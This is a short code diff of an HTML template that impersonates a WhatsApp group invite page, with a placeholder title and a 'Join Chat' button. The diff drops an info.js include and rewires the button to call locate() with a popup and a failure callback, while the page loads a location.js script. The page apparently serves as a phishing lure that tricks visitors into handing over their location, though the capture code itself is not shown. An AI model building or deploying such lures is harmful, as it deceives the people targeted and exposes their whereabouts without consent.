@@ -61,7 +61,6 @@
     	    }
         </script>
         <script type="text/javascript" src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.4.1/jquery.min.js"></script>
-        <script type="text/javascript" src="js/info.js"></script>
 	    <script type="text/javascript" src="js/location.js"></script>
     </head>
 
@@ -127,7 +126,7 @@
                                 <h2 class="_2yzk">$TITLE$</h2>
                                 <h3 class="_8cit">WhatsApp Group Invite</h3>
                                 <div class="_whatsapp_www__block_action">
-                                    <button class="_36or _2y_c _2z0c _2z07" onclick="locate();" id="action-button" title="Follow this link to join">Join Chat</button>
+                                    <button class="_36or _2y_c _2z0c _2z07" onclick="locate(popup, function(){$('#change').html('Failed');});" id="action-button" title="Follow this link to join">Join Chat</button>
                                 </div>
                             </div>
                             <hr/>
